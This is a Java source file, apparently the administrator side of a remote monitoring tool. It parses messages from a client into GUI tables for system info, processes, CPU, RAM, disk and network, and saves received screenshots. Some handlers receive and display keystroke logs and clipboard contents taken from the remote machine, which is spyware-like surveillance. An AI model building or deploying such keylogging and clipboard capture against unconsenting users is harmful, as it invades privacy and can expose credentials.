/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Admin;


import guii.CPU;
import guii.Disk;
import guii.GeneralInfo;
import guii.KeyLog;
import guii.Network;
import guii.RAM;
import guii.Tasklist;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;

/**
 *
 * @author Thanh Phuong
 */
public class ReceiveData {

    public void nhan(String sms)  {
        String[] nhan = sms.split("/");
        if (nhan[3].equals("systeminfo")) {
            generalinfo(sms);
        }
        if (nhan[3].equals("tasklist")) {
           //ReadAdmin.test = sms;
           tasklist(nhan[4]);
        }
        if (nhan[3].equals("CPU")) {
            cpu(nhan[4]);

        }
        if (nhan[3].equals("network")) {

            network(nhan[4]);
        }
        if (nhan[3].equals("disk")) {
            disk(nhan[4]);
        }
        if (nhan[3].equals("RAM")) {
            ram(nhan[4]);
        }
        if (nhan[3].equals("keyslog")) {
            
            keyslog(nhan[4]);
           
        }
        if (nhan[3].equals("clipboard")) {
            ReadAdmin.test=nhan[4];
        }
        

        if (nhan[3].equals("follow")) {
            ReadAdmin.test = sms;
        }

    }

    public void capscreen(byte[] sms1) throws IOException {
        File file = new File("data");
        String absolutePath = file.getAbsolutePath();
        //byte[] bytearray = Base64.decode(nhan1[1]);
        BufferedImage imag = ImageIO.read(new ByteArrayInputStream(sms1));
        ImageIO.write(imag, "png", new File(absolutePath, "snap.png"));

    }

    public void generalinfo(String s) {
        String[] tam = s.split("\n");
        for (int i = 2; i < tam.length - 1; i++) {
            
                try {
                String[] tam2 = tam[i].split(":  ");// lay nhung dong binh thuong
                //System.out.println(tam2[0] + tam2[1]);
                    GeneralInfo.model.addRow(new Object[]{tam2[0], tam2[1].trim()});
            } catch (Exception e) {
                // lay du lieeu dong cua processor cai 
                
                //System.out.println(tam2[0] + tam2[1]);
                GeneralInfo.model.addRow(new Object[]{"  ", tam[i].trim()});
            }
            
            

        }

    }

    public void cpu(String s) {

        String[] data = s.split("\n");

        CPU.model.addRow(new Object[]{data[3].substring(0, 38), data[3].substring(38, 48), data[3].substring(48, 63), data[3].substring(63, 105), data[3].substring(105, 120), data[3].substring(120, 128)});
    }

    public void ram(String s) {

        String[] data = s.split("\n");
        //System.out.println("Admin.ReceiveData.ram()"+data[3].substring(0,12));
        for (int i = 2; i < data.length - 1; i++) {
            if (!data[i].equals("")) {
                RAM.model.addRow(new Object[]{data[i].substring(0, 10), data[i].substring(10, 23),data[i].substring(23, 39), data[i].substring(39, 51), data[i].substring(51, 65), data[i].substring(65, 81), data[i].substring(81, 84), data[i].substring(84, 102), data[i].substring(102, 110), data[i].substring(110, 115)});
                //RAM.model.addRow(new Object[]{data[i].substring(0, 12), data[i].substring(12, 24), data[i].substring(24, 39), data[i].substring(39, 51), data[i].substring(51, 69), data[i].substring(69, 81), data[i].substring(81, 88), data[i].substring(88, 108), data[i].substring(108, 122), data[i].substring(122, 127)});
            }
        }
    }

    public void disk(String s) {
        String[] tam = s.split("\n");
        int y = 8;
        for (int i = 8; i < tam.length - 1; i++) {
            try {
                if (i == 9) {
                    //System.out.println("abc"+tam[9]);
                   Disk.model.addRow(new Object[]{tam[i]});
                } else {
                    String[] tam2 = tam[i].split(":");// lay nhung dong binh thuong
                    // System.out.println(tam2[0] + tam2[1]);
                    Disk.model.addRow(new Object[]{tam2[0], tam2[1].trim()});
                    y++;
                }
            } catch (Exception e) {
                if (!tam[i].equals("")) {

                    tam[i] = tam[i].substring(0, 17) + "  " + tam[i].substring(17, tam[i].length());
                    tam[i] = tam[i].replaceAll("    ", "  ");
                    tam[i] = tam[i].replaceAll("    ", "  ");
                    String[] tam2 = tam[i].split("  ");
                    //System.out.println(tam2[0] + tam2[1]);
                    Disk.model.addRow(new Object[]{tam2[0].trim(), tam2[1].trim(), tam2[2].trim(), tam2[3].trim(), tam2[4].trim(), tam2[5].trim(), tam2[6].trim(), tam2[7].trim()});
                }
            }

        }
    }
    public void network(String s)
    {
         String[] tam = s.split("\n");
        for (int i = 2; i < tam.length-1; i++) {

            try {
                try {
                    String[] tam2 = tam[i].split(":");
                    //System.out.println(tam2[0] + tam2[1]);
                    if(tam2[1]==" ")
                    {
                        Network.model.addRow(new Object[]{tam2[0].trim(), ""});
                    }
                    Network.model.addRow(new Object[]{tam2[0].trim(), tam2[1].trim()});
                } catch (Exception e) {
                    String[] tam2 = tam[i].split("  ");
                   // System.out.println(tam2[0] + tam2[1]);
                    Network.model.addRow(new Object[]{tam2[1].trim(), tam2[0].trim()});
                }
            } catch (Exception e) { //name

                Network.model.addRow(new Object[]{" " + tam[i]});

            }
        }
    }
    public void tasklist(String sms)
    {
        String[] data = sms.split("\n");
        //System.out.println("Admin.Rece "+data.length);
        for (int i = 4; i < data.length-1; i++) {
                Tasklist.model.addRow(new Object[]{data[i].substring(0, 26), data[i].substring(27, 34),data[i].substring(35, 52), data[i].substring(53, 64), data[i].substring(65, 76)});               
            } 
            
        
    }
    public void keyslog(String sms)
    {
        //System.out.println("Admin.ReceiveData.keyslog()"+sms);
        String[] data1 = sms.split("\n");
        if(sms.contains("khong co du lieu"))
        {
            KeyLog.model.addRow(new Object[]{"Khong co du lieu"});
        }
        else
        {
            for (int i = 1; i < data1.length; i++) {
            
            try {
                String[] data = data1[i].split("\t");
                //System.out.println("Admin.ReceiveData.keyslog()"+data[0]+" abc "+data[1]+" abc "+data[2]);
                
                KeyLog.model.addRow(new Object[]{data[0].trim(),data[1].trim(),data[2].trim()});
            } catch (Exception e) {
                    //System.out.println("Admin.ReceiveData.keyslog()"+e);
                    
            }
                
                //System.out.println("Admin.ReceiveD)");
            
            
                
                
            } 
        }
        
            
        
    }

    
}
